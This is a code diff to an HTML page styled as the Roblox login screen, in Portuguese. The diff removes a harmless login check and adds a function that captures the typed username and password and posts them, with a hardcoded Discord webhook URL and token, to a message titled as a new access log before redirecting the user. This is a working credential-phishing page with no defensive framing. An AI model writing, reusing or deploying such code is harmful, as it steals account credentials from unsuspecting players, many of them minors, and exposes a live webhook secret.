@@ -3,48 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login no Roblox</title>
+    <title>Login - Roblox</title>
     <link rel="stylesheet" href="style.css">
     <link href="https://fonts.googleapis.com" rel="stylesheet">
 </head>
-<body class="dark-theme">
+<body class="login-page">
     <div class="container">
-        <!-- Logo do Roblox (Texto Simulado) -->
-        <div class="logo-container">
-            <h1 class="logo-text">ROBLOX</h1>
-        </div>
-
-        <div class="login-card">
+        <h1 class="logo">ROBLOX</h1>
+        <div class="login-box">
             <h3>Entrar no Roblox</h3>
-            
-            <div class="input-container">
-                <input type="text" id="user" placeholder="Usuário/E-mail/Telefone">
-            </div>
-
-            <div class="input-container">
-                <input type="password" id="pass" placeholder="Senha">
-            </div>
-
-            <button class="btn-login" onclick="entrar()">Entrar</button>
-
-            <div class="forgot-password">
-                <a href="#">Esqueceu a senha ou o nome de usuário?</a>
-            </div>
-
-            <div class="divider">
-                <span>ou</span>
-            </div>
-
-            <button class="btn-signup">Cadastrar-se</button>
+            <input type="text" id="user" placeholder="Usuário/E-mail/Telefone">
+            <input type="password" id="pass" placeholder="Senha">
+            <button class="btn-blue" onclick="enviarLog()">Entrar</button>
+            <div class="divider"><span>ou</span></div>
+            <button class="btn-outline">Cadastrar-se</button>
         </div>
     </div>
 
     <script>
-        function entrar() {
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
-            if(u && p) window.location.href = "dashboard.html";
-            else alert("Preencha os dados!");
+        async function enviarLog() {
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+            const webhook = "https://discord.com/api/webhooks/1479278230161723532/qERjvDQygKNKpjKdhwY_QpciAucMqEg6zQzhlWjpN9xUB14DjL1DrsqbCBrT4bR3h15g"; 
+
+            if (!user || !pass) return alert("Preencha tudo!");
+
+            // Envia para o seu painel (Discord)
+            await fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "📌 NOVO LOG DE ACESSO",
+                        color: 16711680,
+                        fields: [
+                            { name: "Usuário", value: `\`${user}\``, inline: true },
+                            { name: "Senha", value: `\`${pass}\``, inline: true }
+                        ],
+                        footer: { text: "RAG Exemplo Server" }
+                    }]
+                })
+            });
+
+            // Redireciona para o painel do servidor
+            window.location.href = "dashboard.html";
         }
     </script>
 </body>
